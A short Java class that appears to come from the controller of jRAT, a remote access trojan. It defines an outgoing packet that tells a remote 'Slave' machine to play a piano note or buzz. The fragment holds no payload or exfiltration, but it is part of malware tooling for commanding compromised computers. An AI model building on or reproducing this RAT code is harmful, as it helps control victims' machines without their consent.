package io.jrat.controller.packets.outgoing;

import io.jrat.controller.Slave;
import java.io.DataOutputStream;


public class Packet66PianoNote extends AbstractOutgoingPacket {

	private int note;
	private boolean buzz;

	public Packet66PianoNote(int note, boolean buzz) {
		this.note = note;
		this.buzz = buzz;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		dos.writeInt(note);
		dos.writeBoolean(buzz);
	}

	@Override
	public short getPacketId() {
		return 66;
	}

}
